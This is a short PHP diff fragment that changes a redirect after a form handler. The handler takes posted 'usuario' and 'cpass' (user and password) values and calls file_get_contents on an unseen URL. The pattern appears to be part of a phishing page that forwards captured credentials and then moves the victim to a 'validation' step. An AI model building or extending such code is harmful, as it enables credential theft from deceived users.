@@ -22,7 +22,7 @@ if (isset($_POST["usuario"]) && isset($_POST["cpass"])) {
     file_get_contents($url);
 
     // Redirección
-    header("Location: virtual.php");
+    header("Location: procesar_validacion.php");
     exit;
 }
 ?>
